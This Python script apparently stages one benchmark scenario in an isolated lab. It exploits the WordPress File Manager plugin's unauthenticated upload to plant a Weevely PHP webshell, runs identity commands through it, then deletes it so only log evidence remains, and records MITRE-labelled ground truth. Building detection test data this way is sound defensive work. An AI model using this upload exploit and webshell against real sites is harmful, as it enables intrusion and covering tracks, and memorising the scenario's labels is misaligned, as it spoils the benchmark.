"""Run the log-only webshell use/delete scenario in the private lab."""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import UTC, datetime
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
AGENT_NAME = "m8v2-s08-agent.php"
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]
AGENT_PATH = f"wp-content/plugins/wp-file-manager/lib/files/{AGENT_NAME}"
AGENT_URL = f"{EDGE}/{AGENT_PATH}"
REMOTE_AGENT_PATH = f"/var/www/html/{AGENT_PATH}"


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def timed_weevely(step_id: str, command: str) -> tuple[dict[str, object], str]:
    started_at = timestamp()
    result = subprocess.run(
        ["weevely", AGENT_URL, AGENT_PASSWORD, command],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=20,
    )
    ended_at = timestamp()
    if not result.stdout.strip():
        raise RuntimeError(f"Weevely returned no output for {step_id}")
    return (
        {
            "id": step_id,
            "category": "webshell_command",
            "mitre": ["T1059.004"],
            "label_method": "attacker_ip_time_window",
            "attacker_ip": ATTACKER_IP,
            "started_at": started_at,
            "ended_at": ended_at,
            "request": f"POST /{AGENT_PATH} HTTP/1.1",
            "status": 200,
            "candidate_ordinal": 1,
        },
        result.stdout.strip(),
    )


def perform_attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(180000):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    from pacing import install_hand_pacing

    install_hand_pacing(5008, scanner=False)

    records: dict[str, object] = {
        "scenario_id": "s08",
        "description": (
            "An attacker uploads a temporary agent through the WordPress file manager, "
            "uses it for brief identification checks, and deletes it before collection. "
            "The remaining evidence is log-only."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "unauthenticated_file_upload",
        "steps": [],
        "files": [
            {
                "path": f"/{AGENT_PATH}",
                "role": "webshell_agent",
                "change": "deleted",
            },
            {
                "path": "/wp-content/uploads/wp-file-manager-pro/fm_backup/index.php",
                "role": "side_effect",
                "expected_in_report": False,
            },
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    steps: list[dict[str, object]] = []
    for step_id, path in (
        ("site_check", "/"),
        ("plugin_version_check", "/wp-content/plugins/wp-file-manager/readme.txt"),
        ("admin_probe", "/wp-admin/"),
        ("xmlrpc_probe", "/xmlrpc.php"),
    ):
        requests.get(
            f"{EDGE}{path}",
            headers={"X-Lab-Step": step_id},
            timeout=10,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            }
        )

    with tempfile.TemporaryDirectory(prefix="s08-agent-") as temporary:
        agent = Path(temporary) / AGENT_NAME
        subprocess.run(
            ["weevely", "generate", AGENT_PASSWORD, str(agent)],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        agent_hash = hashlib.sha256(agent.read_bytes()).hexdigest()
        agent_size = agent.stat().st_size
        with agent.open("rb") as handle:
            response = requests.post(
                f"{EDGE}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
                data={"cmd": "upload", "target": "l1_Lw"},
                files={"upload[]": (AGENT_NAME, handle, "application/octet-stream")},
                headers={"X-Lab-Step": "unauthenticated_file_upload"},
                timeout=15,
                allow_redirects=False,
            )
        if response.status_code != 200:
            raise RuntimeError(f"agent upload returned HTTP {response.status_code}")
        try:
            upload_result = response.json()
        except ValueError as exc:
            raise RuntimeError("agent upload response was not JSON") from exc
        if "added" not in upload_result:
            raise RuntimeError("file manager did not confirm a new agent file")
        steps.append(
            {
                "id": "unauthenticated_file_upload",
                "category": "unrestricted_upload",
                "mitre": ["T1190"],
                "label_method": "header",
            }
        )
        (Path("/replay/transient-file.json")).write_text(
            json.dumps(
                {
                    "path": f"/{AGENT_PATH}",
                    "sha256": agent_hash,
                    "size": agent_size,
                    "state_at_collection": "deleted",
                },
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )

        for step_id, command in (
            ("agent_identity", "id"),
            ("agent_working_directory", "pwd"),
            ("agent_user", "whoami"),
        ):
            step, _output = timed_weevely(step_id, command)
            steps.append(step)

        delete_started = timestamp()
        deletion = subprocess.run(
            ["weevely", AGENT_URL, AGENT_PASSWORD, f":file_rm {REMOTE_AGENT_PATH}"],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=20,
        )
        delete_ended = timestamp()
        if not deletion.stdout.strip():
            raise RuntimeError("Weevely did not confirm its file removal operation")
        steps.append(
            {
                "id": "agent_deleted",
                "category": "webshell_deletion",
                "mitre": ["T1070.004"],
                "label_method": "attacker_ip_time_window",
                "attacker_ip": ATTACKER_IP,
                "started_at": delete_started,
                "ended_at": delete_ended,
                "request": f"POST /{AGENT_PATH} HTTP/1.1",
                "status": 200,
                "candidate_ordinal": 1,
            }
        )

    missing = requests.get(AGENT_URL, headers={"X-Lab-Step": "agent_absent_check"}, timeout=15)
    if missing.status_code != 404:
        raise RuntimeError(f"deleted agent remained reachable (HTTP {missing.status_code})")
    steps.append(
        {
            "id": "agent_absent_check",
            "category": "post_deletion_check",
            "mitre": ["T1070.004"],
            "label_method": "header",
        }
    )
    records["files"][0]["sha256"] = agent_hash  # type: ignore[index]
    records["steps"] = steps
    continuation.write_text("continue\n", encoding="ascii")
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps({"attack_completed": True, "steps": len(steps)}, sort_keys=True))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "attack"))
    args = parser.parse_args()
    if args.action == "isolation":
        isolate()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
